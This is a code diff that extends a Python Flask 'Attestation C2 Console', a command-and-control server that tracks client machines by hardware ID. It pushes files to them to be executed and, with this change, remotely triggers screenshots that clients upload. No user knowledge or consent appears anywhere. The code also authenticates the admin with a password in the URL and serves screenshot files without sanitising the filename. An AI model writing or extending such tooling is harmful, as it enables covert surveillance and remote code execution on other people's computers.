@@ -1,8 +1,10 @@
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, jsonify, render_template_string, send_file
 import json
 import os
 import base64
+import io
 from datetime import datetime, timedelta
+from PIL import Image
 
 app = Flask(__name__)
 
@@ -16,6 +18,8 @@ def after_request(response):
 
 # ===== Persistent storage =====
 DATA_FILE = "players_data.json"
+SCREENSHOT_DIR = "screenshots"
+os.makedirs(SCREENSHOT_DIR, exist_ok=True)
 
 def load_data():
     if os.path.exists(DATA_FILE):
@@ -40,7 +44,7 @@ def add_username(hwid, username):
         PLAYERS[hwid].setdefault('usernames', []).append(username)
 
 # ============================================
-# HTML ADMIN DASHBOARD
+# HTML ADMIN DASHBOARD (no auto-refresh)
 # ============================================
 DASHBOARD_HTML = """
 <!DOCTYPE html>
@@ -64,11 +68,15 @@ DASHBOARD_HTML = """
         .btn-unban { background: #27ae60; color: white; }
         .btn-copy { background: #3498db; color: white; }
         .btn-file { background: #9b59b6; color: white; }
+        .btn-screenshot { background: #2ecc71; color: black; }
+        .btn-refresh { background: #3498db; color: white; }
         .btn-kick:hover { background: #f39c12; }
         .btn-ban:hover { background: #c0392b; }
         .btn-unban:hover { background: #2ecc71; }
         .btn-copy:hover { background: #2980b9; }
         .btn-file:hover { background: #8e44ad; }
+        .btn-screenshot:hover { background: #27ae60; }
+        .btn-refresh:hover { background: #2980b9; }
         .settings-input { width: 80px; padding: 3px; background: #222; color: #fff; border: 1px solid #555; }
         .settings-btn { padding: 3px 8px; background: #3498db; color: white; border: none; border-radius: 3px; cursor: pointer; }
         .settings-btn:hover { background: #2980b9; }
@@ -84,8 +92,10 @@ DASHBOARD_HTML = """
         .file-status { font-size: 11px; color: #aaa; }
         .file-status.delivered { color: #0f0; }
         .file-status.executed { color: #0ff; }
+        .screenshot-link { color: #2ecc71; text-decoration: underline; cursor: pointer; }
         .timestamp { color: #888; font-size: 0.8em; }
         .username-list { font-weight: bold; color: #0f0; }
+        .refresh-section { margin-bottom: 15px; }
     </style>
     <script>
         function copyHWID(hwid) {
@@ -154,13 +164,36 @@ DASHBOARD_HTML = """
             };
             reader.readAsDataURL(file);
         }
+        function takeScreenshot(hwid) {
+            fetch('/admin/screenshot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ hwid: hwid })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'ok') {
+                    alert('Screenshot requested. It will appear in the dashboard shortly.');
+                } else {
+                    alert('Error: ' + data.error);
+                }
+            })
+            .catch(err => alert('Network error: ' + err));
+        }
+        function refreshPage() {
+            location.reload();
+        }
     </script>
 </head>
 <body>
     <h1>⚡ Attestation C2 Console</h1>
+    <div class="refresh-section">
+        <button class="btn btn-refresh" onclick="refreshPage()">🔄 Refresh</button>
+        <span style="margin-left:15px;color:#888;">Last updated: {{ now }}</span>
+    </div>
     <p>Active players (last 20s): <span id="active-count">{{ active_players|length }}</span></p>
     <table>
-        <thead><tr><th>HWID</th><th>Username(s)</th><th>Last Seen</th><th>Status</th><th>Settings Override</th><th>Send File</th><th>File Status</th><th>Actions</th></tr></thead>
+        <thead><tr><th>HWID</th><th>Username(s)</th><th>Last Seen</th><th>Status</th><th>Settings Override</th><th>Send File</th><th>File Status</th><th>Screenshot</th><th>Actions</th></tr></thead>
         <tbody>
         {% for hwid, data in active_players.items() %}
         <tr class="active">
@@ -194,6 +227,13 @@ DASHBOARD_HTML = """
                     <span class="file-status">{{ pending.filename }} ({{ pending.status }})</span>
                 {% else %}
                     <span class="file-status">No file</span>
+                {% endif %}
+            </td>
+            <td>
+                {% if screenshots.get(hwid) %}
+                    <a href="/screenshots/{{ screenshots[hwid] }}" target="_blank" class="screenshot-link">View</a>
+                {% else %}
+                    <button class="btn btn-screenshot" onclick="takeScreenshot('{{ hwid }}')">📷</button>
                 {% endif %}
             </td>
             <td>
@@ -272,9 +312,6 @@ DASHBOARD_HTML = """
         {% endfor %}
         </tbody>
     </table>
-
-    <p style="margin-top:20px;color:#888;">Auto-refreshes every 10 seconds.</p>
-    <script>setTimeout(() => location.reload(), 10000);</script>
 </body>
 </html>
 """
@@ -282,6 +319,8 @@ DASHBOARD_HTML = """
 # ============================================
 # ADMIN PANEL
 # ============================================
+screenshot_files = {}  # hwid -> filename
+
 @app.route('/admin', methods=['GET'])
 def admin_panel():
     pwd = request.args.get('pass')
@@ -316,7 +355,9 @@ def admin_panel():
                                    active_players=active,
                                    all_players=all_players,
                                    users=users,
-                                   pending_files=PENDING_FILES)
+                                   pending_files=PENDING_FILES,
+                                   screenshots=screenshot_files,
+                                   now=now.strftime("%H:%M:%S"))
 
 # ============================================
 # CLIENT API
@@ -349,7 +390,12 @@ def register():
         'settings_override': PLAYERS[hwid].get('settings_override', {})
     }
 
-    # Check for pending file that hasn't been delivered yet
+    # Check for pending screenshot request
+    if hwid in screenshot_requests and screenshot_requests[hwid]:
+        response['screenshot'] = True
+        del screenshot_requests[hwid]
+
+    # Check for pending file
     if hwid in PENDING_FILES and PENDING_FILES[hwid].get('status') == 'queued':
         response['file_payload'] = {
             'filename': PENDING_FILES[hwid]['filename'],
@@ -366,20 +412,53 @@ def register():
     return jsonify(response)
 
 # ============================================
-# ACKNOWLEDGMENT ENDPOINT
+# SCREENSHOT UPLOAD (from client)
 # ============================================
-@app.route('/ack', methods=['POST'])
-def ack():
+@app.route('/upload_screenshot', methods=['POST'])
+def upload_screenshot():
     data = request.json
     hwid = data.get('hwid')
-    filename = data.get('filename')
-    status = data.get('status', 'executed')
-    if hwid in PENDING_FILES and PENDING_FILES[hwid].get('filename') == filename:
-        PENDING_FILES[hwid]['status'] = status
-        print(f"[+] Acknowledgment from {hwid}: {filename} - {status}")
-    else:
-        print(f"[!] Acknowledgment from unknown HWID or file: {hwid} - {filename}")
-    return '', 204
+    image_b64 = data.get('image_b64')
+    if not hwid or not image_b64:
+        return jsonify({'error': 'Missing data'}), 400
+
+    # Save image
+    filename = f"screenshot_{hwid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+    filepath = os.path.join(SCREENSHOT_DIR, filename)
+    try:
+        image_data = base64.b64decode(image_b64)
+        with open(filepath, "wb") as f:
+            f.write(image_data)
+        screenshot_files[hwid] = filename
+        print(f"[+] Screenshot saved for {hwid}: {filename}")
+        return jsonify({'status': 'ok'})
+    except Exception as e:
+        print(f"[!] Screenshot save error: {e}")
+        return jsonify({'error': str(e)}), 500
+
+# ============================================
+# ADMIN: REQUEST SCREENSHOT
+# ============================================
+screenshot_requests = {}  # hwid -> True (pending)
+
+@app.route('/admin/screenshot', methods=['POST'])
+def request_screenshot():
+    data = request.json
+    hwid = data.get('hwid')
+    if not hwid:
+        return jsonify({'status': 'error', 'error': 'Missing HWID'}), 400
+    if hwid not in PLAYERS:
+        return jsonify({'status': 'error', 'error': 'HWID not found'}), 404
+    screenshot_requests[hwid] = True
+    print(f"[+] Screenshot requested for {hwid}")
+    return jsonify({'status': 'ok'})
+
+# ============================================
+# SERVE SCREENSHOTS
+# ============================================
+@app.route('/screenshots/<filename>')
+def serve_screenshot(filename):
+    return send_file(os.path.join(SCREENSHOT_DIR, filename))
 
 # ============================================
 # ADMIN ACTIONS
